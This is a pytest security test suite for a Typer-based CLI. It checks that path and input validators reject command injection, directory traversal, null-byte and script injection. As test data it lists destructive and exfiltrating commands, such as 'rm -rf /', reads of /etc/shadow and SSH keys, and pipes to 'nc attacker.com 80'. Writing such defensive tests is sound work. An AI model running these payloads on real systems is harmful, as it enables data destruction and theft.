"""
Security testing and input validation for Enhanced CLI.

This module tests security measures to prevent command injection, directory traversal,
and other common CLI attack vectors in the Enhanced CLI with Typer implementation.
"""

import pytest
import tempfile
import os
import subprocess
import platform
from pathlib import Path
import sys
from unittest.mock import patch
from click.testing import CliRunner

# Import what we'll be testing
try:
    from emuses.cli.main import app, secure_path_resolver, create_typer_app
    from emuses.cli.security import validate_path, sanitize_input, SecurityError, secure_file_exists
except ImportError:
    # Tests will fail initially if imports don't exist
    app = None
    secure_path_resolver = None
    create_typer_app = None
    SecurityError = None
    validate_path = None
    sanitize_input = None
    secure_file_exists = None


class TestCommandInjectionPrevention:
    """Test command injection prevention in path arguments (Task 4.1)."""

    def test_path_injection_via_semicolon(self):
        """Test prevention of command injection via semicolon in paths."""
        malicious_paths = [
            "/tmp/file.txt; rm -rf /",
            "data.csv; del C:\\Windows\\System32",
            "input.txt;ls -la /etc/passwd",
            "file.txt & rm -rf /",
            "data.csv|format C:",
        ]

        for malicious_path in malicious_paths:
            with pytest.raises((ValueError, SecurityError)):
                validate_path(malicious_path)

    def test_path_injection_via_backticks(self):
        """Test prevention of command injection via backticks."""
        malicious_paths = [
            "`rm -rf /`",
            "file_`whoami`.txt",
            "/tmp/`cat /etc/passwd`.log",
            "data_`id`.csv",
        ]

        for malicious_path in malicious_paths:
            with pytest.raises((ValueError, SecurityError)):
                validate_path(malicious_path)

    def test_path_injection_via_subprocess_expansion(self):
        """Test prevention of subprocess expansion injection."""
        malicious_paths = [
            "$(rm -rf /)",
            "file_$(whoami).txt",
            "/tmp/$(cat /etc/passwd).log",
            "${HOME}/malicious.txt",
            "data_$(id).csv",
        ]

        for malicious_path in malicious_paths:
            with pytest.raises((ValueError, SecurityError)):
                validate_path(malicious_path)

    def test_path_injection_via_shell_metacharacters(self):
        """Test prevention of shell metacharacter injection."""
        malicious_paths = [
            "file.txt || rm -rf /",
            "data.csv && del /s /q C:\\*",
            "input.txt > /dev/null; rm /",
            "file.txt < /etc/passwd",
            "data.csv 2>&1 | nc attacker.com 80",
        ]

        for malicious_path in malicious_paths:
            with pytest.raises((ValueError, SecurityError)):
                validate_path(malicious_path)

    def test_legitimate_paths_accepted(self):
        """Test that legitimate paths are accepted."""
        legitimate_paths = [
            "/home/user/data.txt",
            "C:\\Users\\User\\Documents\\file.csv",
            "./local_file.txt",
            "relative/path/to/file.txt",
            "/tmp/emuses_output/results.json",
            "data_with_underscores.txt",
            "file-with-dashes.csv",
            "file123.txt",
        ]

        for legitimate_path in legitimate_paths:
            # Should not raise an exception
            result = validate_path(legitimate_path)
            assert result == legitimate_path


class TestFilePermissionsAndAccessControls:
    """Test file permissions and access controls (Task 4.2)."""

    def test_directory_traversal_prevention(self):
        """Test prevention of directory traversal attacks."""
        traversal_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc//passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\system32",
        ]

        for traversal_path in traversal_paths:
            with pytest.raises((ValueError, SecurityError)):
                validate_path(traversal_path)

    def test_sensitive_directory_access_prevention(self):
        """Test prevention of access to sensitive directories."""
        sensitive_paths = [
            "/etc/passwd",
            "/sys/kernel/",
            "/proc/version",
            "/dev/random",
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Users\\Administrator\\Desktop",
            "/etc/shadow",
            "/proc/self/environ",
        ]

        for sensitive_path in sensitive_paths:
            with pytest.raises((ValueError, SecurityError)):
                validate_path(sensitive_path)

    def test_secure_file_exists_with_traversal_protection(self):
        """Test secure file existence check with traversal protection."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a test file
            test_file = Path(temp_dir) / "test.txt"
            test_file.write_text("test content")

            # Valid file should be found
            assert secure_file_exists(str(test_file))

            # Non-existent file should return False
            assert not secure_file_exists(str(Path(temp_dir) / "nonexistent.txt"))

            # Traversal attempts should return False or raise error
            traversal_attempts = [
                f"{temp_dir}/../../../etc/passwd",
                f"{temp_dir}/..\\..\\..\\windows\\system32",
            ]

            for traversal_path in traversal_attempts:
                try:
                    result = secure_file_exists(traversal_path)
                    assert not result  # Should return False for invalid paths
                except (ValueError, SecurityError):
                    pass  # Raising an error is also acceptable

    def test_path_length_validation(self):
        """Test validation of excessive path lengths."""
        # Create a path that's too long
        long_path = "a" * 5000

        with pytest.raises((ValueError, SecurityError)):
            validate_path(long_path)

    def test_null_byte_injection_prevention(self):
        """Test prevention of null byte injection."""
        null_byte_paths = [
            "/tmp/file.txt\x00/etc/passwd",
            "data.csv\x00.exe",
            "file\x00injection.txt",
        ]

        for null_path in null_byte_paths:
            with pytest.raises((ValueError, SecurityError)):
                validate_path(null_path)


class TestUserInputSanitization:
    """Test sanitization of user input in interactive mode (Task 4.3)."""

    def test_command_injection_sanitization(self):
        """Test sanitization of command injection attempts."""
        malicious_inputs = [
            "; rm -rf /",
            "& del C:\\\\Windows",
            "| nc attacker.com 80",
            "$( cat /etc/passwd )",
            "`whoami`",
            "|| format C:",
            "&& rm -rf /*",
        ]

        for malicious_input in malicious_inputs:
            with pytest.raises(ValueError, match="Malicious input detected"):
                sanitize_input(malicious_input)

    def test_script_injection_sanitization(self):
        """Test sanitization of script injection attempts."""
        script_injections = [
            "<script>alert('xss')</script>",
            "</script><script>malicious()</script>",
            "javascript:alert('xss')",
            "<>script injection</>",
        ]

        for script_input in script_injections:
            with pytest.raises(ValueError, match="Malicious input detected"):
                sanitize_input(script_input)

    def test_control_character_removal(self):
        """Test removal of control characters from input."""
        input_with_control_chars = "normal_text\x00\x01\x02\x1f"

        with pytest.raises(ValueError, match="Invalid control characters detected"):
            sanitize_input(input_with_control_chars)

    def test_legitimate_input_preserved(self):
        """Test that legitimate input is preserved."""
        legitimate_inputs = [
            "normal_string",
            "file_name_123.txt",
            "path/to/file.csv",
            "model_parameters_v2",
            "emuses_output_folder",
            "train_test_split_0.2",
        ]

        for legitimate_input in legitimate_inputs:
            result = sanitize_input(legitimate_input)
            assert result == legitimate_input

    def test_input_length_limit(self):
        """Test input length limitation."""
        very_long_input = "a" * 20000

        result = sanitize_input(very_long_input)
        assert len(result) <= 10000

    def test_url_encoded_malicious_input(self):
        """Test detection of URL-encoded malicious input."""
        encoded_malicious = [
            "%3B%20rm%20-rf%20%2F",  # ; rm -rf /
            "%26%20del%20C%3A%5C",   # & del C:\
            "%60whoami%60",          # `whoami`
            "%24%28cat%20%2Fetc%2Fpasswd%29",  # $(cat /etc/passwd)
        ]

        for encoded_input in encoded_malicious:
            with pytest.raises(ValueError, match="Malicious input detected"):
                sanitize_input(encoded_input)


class TestTemporaryFileHandling:
    """Test secure handling of temporary files and process spawning (Task 4.4)."""

    def test_secure_temp_directory_creation(self):
        """Test secure temporary directory creation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)

            # Test directory exists and is writable
            assert temp_path.exists()
            assert temp_path.is_dir()

            # Test file creation within temp directory
            test_file = temp_path / "test_file.txt"
            test_file.write_text("test content")
            assert test_file.exists()

            # Test that temp directory is properly isolated
            # Attempt to write outside temp directory should be validated as unsafe
            malicious_paths = [
                str(temp_path / ".." / ".." / "malicious.txt"),
                str(temp_path / "..\\..\\malicious.txt"),
            ]

            for malicious_path in malicious_paths:
                # The path validation should catch this
                with pytest.raises((ValueError, SecurityError)):
                    validate_path(malicious_path)

    def test_temp_file_permissions(self):
        """Test that temporary files have appropriate permissions."""
        with tempfile.NamedTemporaryFile() as temp_file:
            temp_path = Path(temp_file.name)

            # Check file permissions (should not be world-readable on Unix)
            if platform.system() != "Windows":
                stat = temp_path.stat()
                # Check that file is not world-readable (mask 0o044)
                assert not (stat.st_mode & 0o044)

    def test_temp_file_cleanup(self):
        """Test proper cleanup of temporary files."""
        temp_file_path = None

        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
            temp_file_path = temp_file.name
            temp_file.write(b"test content")

        # File should exist after context exit (delete=False)
        assert Path(temp_file_path).exists()

        # Manual cleanup
        os.unlink(temp_file_path)

        # File should be deleted
        assert not Path(temp_file_path).exists()

    @patch('subprocess.run')
    def test_process_spawning_security(self, mock_subprocess):
        """Test secure process spawning to prevent command injection."""
        # Mock subprocess to avoid actual execution
        mock_subprocess.return_value = subprocess.CompletedProcess(
            args=[], returncode=0, stdout=b"", stderr=b""
        )

        # Test that shell=False is used for security
        safe_command = ["python", "-c", "print('hello')"]

        # This should be safe - no shell interpretation
        subprocess.run(safe_command, shell=False, capture_output=True)

        # Verify subprocess was called with shell=False
        mock_subprocess.assert_called_with(
            safe_command, shell=False, capture_output=True
        )

    def test_environment_variable_sanitization(self):
        """Test sanitization of environment variables."""
        malicious_env_values = [
            "; rm -rf /",
            "$(cat /etc/passwd)",
            "`whoami`",
            "& del C:\\Windows",
        ]

        for malicious_value in malicious_env_values:
            with pytest.raises(ValueError):
                sanitize_input(malicious_value)


class TestMaliciousCLIInputs:
    """Test malicious CLI inputs and shell metacharacters (Task 4.5)."""

    def test_typer_command_injection_prevention(self):
        """
        A malicious output folder must be rejected, and must not be created.

        The "not created" assertion is the one that matters. This test previously
        asserted only ``result.exit_code != 0 or "error" in result.output.lower()``,
        which passed because the command failed for an unrelated reason (a missing input
        file, or an HTTP error) while the CLI happily created a directory named
        ``$(whoami)_output``. Nine such directories were committed to the repository
        before anyone noticed. The old assertion would pass with path validation
        removed entirely; this one will not.
        """
        runner = CliRunner()

        malicious_outputs = [
            "/tmp; rm -rf /",
            "output && del C:\\Windows",
            "folder | nc attacker.com 80",
            "$(whoami)_output",
            "`cat /etc/passwd`",
        ]

        for malicious_output in malicious_outputs:
            with runner.isolated_filesystem() as sandbox:
                result = runner.invoke(
                    app, ["full", malicious_output, "test_input.csv"]
                )

                assert result.exit_code == 2, (
                    f"{malicious_output!r} should be rejected with exit code 2, "
                    f"got {result.exit_code}. Output: {result.output}"
                )
                assert "rejected output folder" in result.output, (
                    f"{malicious_output!r} produced no rejection message. "
                    f"Output: {result.output}"
                )

                leftovers = sorted(q.name for q in Path(sandbox).iterdir())
                assert leftovers == [], (
                    f"{malicious_output!r} was rejected but still created {leftovers}"
                )

    def test_special_characters_in_arguments(self):
        """Test handling of special characters in CLI arguments."""
        runner = CliRunner()

        special_char_inputs = [
            "file;injection.txt",
            "data&malicious.csv",
            "input|pipe.txt",
            "file$variable.csv",
            "data`command`.txt",
            "file{expansion}.csv",
            "data[bracket].txt",
            "file(parenthesis).csv",
        ]

        for special_input in special_char_inputs:
            result = runner.invoke(app, ["full", "output", special_input])

            # Should handle gracefully without executing shell commands
            assert result.exit_code != 0 or "error" in result.output.lower()

    def test_unicode_and_encoding_attacks(self):
        """Test handling of Unicode and encoding-based attacks."""
        unicode_attacks = [
            "file\u0000injection.txt",  # Null byte
            "data\u202e_reversed.csv",  # Right-to-left override
            "file\ufeffbom.txt",       # BOM character
            "data\u2028line_sep.csv",  # Line separator
        ]

        for unicode_input in unicode_attacks:
            try:
                # Should either sanitize or reject
                result = sanitize_input(unicode_input)
                # If sanitized, should not contain dangerous characters
                assert "\u0000" not in result
            except ValueError:
                # Rejecting is also acceptable
                pass

    def test_path_argument_validation_edge_cases(self):
        """Test edge cases in path argument validation."""
        edge_case_paths = [
            "",  # Empty path
            " ",  # Whitespace only
            "\t\n\r",  # Whitespace characters
            "." * 1000,  # Many dots
            "/" * 100,   # Many separators
            "a" * 10000,  # Very long path
        ]

        for edge_path in edge_case_paths:
            if edge_path.strip() == "":
                # Empty paths should be rejected
                with pytest.raises(ValueError):
                    validate_path(edge_path)
            else:
                # Other edge cases should be handled gracefully
                try:
                    validate_path(edge_path)
                except (ValueError, SecurityError):
                    # Rejecting problematic paths is acceptable
                    pass

    def test_cli_help_injection_prevention(self):
        """Test that help text cannot be used for injection."""
        runner = CliRunner()

        # Test help with potential injection
        result = runner.invoke(app, ["--help"])

        # Help should not execute any commands or contain dangerous content
        assert result.exit_code == 0
        assert "; rm -rf /" not in result.output
        assert "$(cat /etc/passwd)" not in result.output
        assert "`whoami`" not in result.output

    def test_argument_parsing_with_quotes(self):
        """
        Quoted injection payloads must be rejected too, and create nothing.

        Same history as test_typer_command_injection_prevention: the previous assertion
        tolerated any non-zero exit, so it never noticed that the directory was being
        created.
        """
        runner = CliRunner()

        quoted_inputs = [
            '"output; rm -rf /"',
            "'input && del C:\\\\Windows'",
            '`malicious command`',
            '"$(cat /etc/passwd)"',
            "'file | nc attacker.com'",
        ]

        for quoted_input in quoted_inputs:
            with runner.isolated_filesystem() as sandbox:
                result = runner.invoke(app, ["full", quoted_input, "test_input.csv"])

                assert result.exit_code == 2, (
                    f"{quoted_input!r} should be rejected with exit code 2, "
                    f"got {result.exit_code}. Output: {result.output}"
                )

                leftovers = sorted(q.name for q in Path(sandbox).iterdir())
                assert leftovers == [], (
                    f"{quoted_input!r} was rejected but still created {leftovers}"
                )


@pytest.mark.integration
class TestSecurityIntegration:
    """Integration tests for security validation across components."""

    def test_end_to_end_security_validation(self):
        """Test end-to-end security validation in a realistic scenario."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create legitimate test files
            input_file = Path(temp_dir) / "input.csv"
            input_file.write_text("col1,col2\n1,2\n3,4\n")

            output_dir = Path(temp_dir) / "output"
            output_dir.mkdir()

            runner = CliRunner()

            # Test with legitimate inputs
            result = runner.invoke(app, [
                "full",
                str(output_dir),
                str(input_file),
                "--test_size", "0.2",
                "--random_state", "42"
            ])

            # Should handle legitimate inputs without security errors
            # (May fail for other reasons like missing dependencies)
            if "security" in result.output.lower() or "injection" in result.output.lower():
                pytest.fail("Security error with legitimate inputs")

    def test_concurrent_security_validation(self):
        """Test security validation under concurrent access."""
        import threading
        import time

        results = []
        errors = []

        def test_validation():
            try:
                # Test path validation concurrently
                for i in range(10):
                    legitimate_path = f"/tmp/test_file_{i}.txt"
                    result = validate_path(legitimate_path)
                    results.append(result)

                    # Also test malicious path rejection
                    try:
                        validate_path(f"../../../etc/passwd_{i}")
                        errors.append(f"Failed to reject malicious path {i}")
                    except (ValueError, SecurityError):
                        pass  # Expected

                    time.sleep(0.001)  # Small delay
            except Exception as e:
                errors.append(str(e))

        # Run multiple threads
        threads = [threading.Thread(target=test_validation) for _ in range(3)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

        # Check results
        assert len(errors) == 0, f"Concurrent validation errors: {errors}"
        assert len(results) == 30  # 10 results per thread * 3 threads

    def test_memory_exhaustion_prevention(self):
        """Test prevention of memory exhaustion attacks."""
        # Test very large input strings
        large_input = "a" * 1000000  # 1MB string

        # Should limit input size
        result = sanitize_input(large_input)
        assert len(result) <= 10000

        # Test many validation calls
        for i in range(1000):
            try:
                validate_path(f"test_path_{i}")
            except Exception:
                pass  # Individual failures are OK

        # Should not consume excessive memory or crash


if __name__ == "__main__":
    pytest.main([__file__])
